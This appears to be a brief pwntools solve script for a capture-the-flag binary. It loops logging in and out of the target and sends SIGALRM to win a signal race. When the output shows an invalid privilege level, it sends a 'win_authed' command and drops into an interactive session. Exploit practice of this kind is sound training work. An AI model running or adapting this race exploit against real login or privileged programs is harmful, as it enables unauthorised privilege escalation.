#!/bin/python

from pwn import *
from os  import *
import time
import signal

context.log_level = 'error'

argv = ['nice', '-n19', sys.argv[1]]
if len(sys.argv) > 2:
    argv.insert(0, 'strace')
    argv.insert(0, 'sudo')

pids = []


while True:
    with process(argv) as proc:
        proc.sendline(b"login")
        proc.sendline(b"logout")
        kill(proc.pid, signal.SIGALRM)

        try:
            out = proc.recv(timeout=1)
            if b"Privilege level: -1" in out:
                proc.sendline(b"win_authed")
                proc.interactive()
        except:
            pass
    
